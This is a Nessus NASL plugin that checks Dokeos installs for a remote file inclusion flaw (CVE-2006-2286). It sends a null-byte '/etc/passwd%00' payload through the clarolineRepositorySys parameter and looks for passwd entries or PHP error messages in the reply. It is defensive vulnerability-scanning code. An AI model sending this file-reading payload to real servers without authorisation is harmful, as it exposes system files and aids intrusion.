#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(21214);
  script_version("1.20");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-2286");

  script_name(english:"Dokeos < 1.6.4 / 2.0.3 Multiple Scripts Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to remote file include attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Dokeos, an open source, e-learning and
course management web application written in PHP. 

The version of Dokeos installed on the remote host fails to sanitize
user-supplied input to several parameters before using it in several
scripts to include PHP code from other files.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these issues to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts.");
  # http://web.archive.org/web/20071022032050/http://www.dokeos.com/forum/viewtopic.php?t=6848
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?160600e4");
  # http://web.archive.org/web/20110716001152/http://www.dokeos.com/wiki/index.php/Security
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?95e0872f");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Dokeos 1.6.4 / Dokeos Community Release 2.0.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/04/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/04/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dokeos:dokeos_community_release");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/dokeos", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to generate an error.
  file = "/etc/passwd%00";
  r = http_send_recv3(port: port, method: "GET", 
    item:string(
      dir, "/claroline/resourcelinker/resourcelinker.inc.php?",
      "clarolineRepositorySys=", file ) );
  if (isnull(r)) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:r[2]) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0lang/english/resourcelinker\.inc\.php.+ failed to open stream", string:r[2]) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:r[2]) ||
    # we get an error about open_basedir restriction or...
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:r[2])
  )
  {
    if (egrep(string:r[2], pattern:"root:.*:0:[01]:")) 
      contents = r[2] - strstr(r[2], "<br />");

    if (isnull(contents)) security_warning(port);
    else
    {
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
        "\n",
        "Here are the duplicated contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    exit(0);
  }
}
